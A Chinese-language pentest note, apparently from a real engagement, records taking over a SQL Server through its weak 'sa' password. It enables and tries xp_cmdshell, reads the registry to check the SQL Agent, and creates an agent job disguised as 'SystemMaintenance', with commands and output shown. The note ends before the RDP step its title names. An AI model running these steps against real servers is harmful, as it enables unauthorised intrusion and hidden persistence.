---
aliases:
cssclasses:
tags:
icon: pen-to-square
date: 2025-10-16
title: 从mssql到rdp远程桌面连接
category:
  - 项目
---
`fscan`扫描，爆出`mssql`弱密码`san:1`
使用sqsh连接mssql
```bash
sqsh -S 10.99.xx.xx -U sa -P 1
```
## 首次`xp_cmdshell`RCE尝试
为了执行命令，首先查看最短最方便的路径`xp_cmdshell`命令执行
启动`xp_cmdshell`
```bash
1> EXEC sp_configure 'show advanced options', 1; 
2> RECONFIGURE; 
3> go 
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. (return status = 0)
```
查询`xp_cmdshell`是否启用
```bash
1>EXEC sp_configure 'xp_cmdshell';
2>go

name
        ----------------------------------------------------------------------------------------------------------------
        xp_cmdshell

        minimum     maximum     config_value run_value
        ----------- ----------- ------------ -----------
                  0           1            1           1
```
显示已经启用
但是在命令执行时却出现问题
```bash
1> EXEC xp_cmdshell 'whoami'; 
2> go 
Msg 15121, Level 16, State 21 Server 'ZHANGWEI', Procedure 'xp_cmdshell', Line 1
An error occurred during the execution of xp_cmdshell. A call to 'CreateProcess' failed with error code: '5'. (return status = 15121)
```
错误代码5，这表示“访问被拒绝”。这通常是由于SQL Server服务账户没有足够的权限来执行命令。
尝试使用方案二进行命令执行
## SQL Agent 作业RCE
首先查询`SQL Agent`是否启动
```bash
1> DECLARE @agent_status INT; 
EXEC master.dbo.xp_regread 
'HKEY_LOCAL_MACHINE', 
'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT',
'Start',
@agent_status OUTPUT;
SELECT 
	CASE @agent_status 
		WHEN 2 THEN 'Auto Start' 
		WHEN 3 THEN 'Manual Start' 
		WHEN 4 THEN 'Disabled' 
		ELSE 'Unknown' 
	END AS AgentStatus; 
2> go 
(return status = 0) 

AgentStatus 
------------------------------------------------ 
Auto Start (1 row affected)
```
查询到`agent`状态为自启动，意味指`agent`现在处于启动状态
### 准备步骤
```bash
1> USE msdb; 
2> go 
1> EXEC dbo.sp_add_job 
	@job_name = 'SystemMaintenance', 
	@enabled = 1, 
	@description = 'System maintenance tasks'; 
2> go 
(return status = 0)
```
切换上下文到msdb系统数据库
执行系统存储过程 `sp_add_job`，并设置相应参数以及描述
### 总结：
这段代码在 `msdb`数据库中创建了一个名为 ​**​`SystemMaintenance`​**​ 的 SQL Server 代理作业，该作业处于启用状态，并添加了描述信息。后续需要进一步配置作业步骤（如备份数据库、重建索引等）和调度计划，才能使作业实际运行。
